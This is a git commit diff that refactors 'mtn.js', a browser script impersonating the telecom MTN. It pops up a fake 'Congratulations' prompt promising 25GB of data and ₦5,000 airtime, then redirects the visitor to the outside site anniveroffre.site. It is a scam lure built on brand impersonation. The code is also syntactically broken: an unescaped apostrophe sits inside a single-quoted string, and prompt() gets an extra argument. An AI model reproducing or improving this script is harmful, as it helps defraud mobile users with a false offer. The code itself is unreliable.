017dfbfc59093e69597498fcc76088e970d2a494
domiebizzy <polygon_snit2p@icloud.com>
2026-08-08 18:09:58 +0100

    Refactor password prompt and condition check

--- mtn.js
+++ mtn.js
@@ -1,12 +1,10 @@
+var password = '25GB DATA + ₦5,000 Airtime';
 
-    var password = '25GB DATA + ₦5,000 Airtime';
 password = prompt(
-'MTN: Congratulations ! You're eligible to receive 25GB DATA + ₦5000 Airtime Gifts as our valued customer in celebration of our 25th anniversary this Year. Click OK to get offer.','25GB + ₦5,000 Airtime'
+  'MTN: Congratulations ! You're eligible to receive 25GB DATA + ₦5000 Airtime Gifts as our valued customer in celebration of our 25th anniversary this Year. Click OK to get offer.','25GB + ₦5,000 Airtime',
+  '25GB DATA + ₦5,000 Airtime'
+);
 
-);if (password != '25GB DATA + ₦5,000 Airtime') {
-
+if (password !== '25GB DATA + ₦5,000 Airtime') {
     location.href = 'https://www.anniveroffre.site/25gb';
-
 }
-
-  
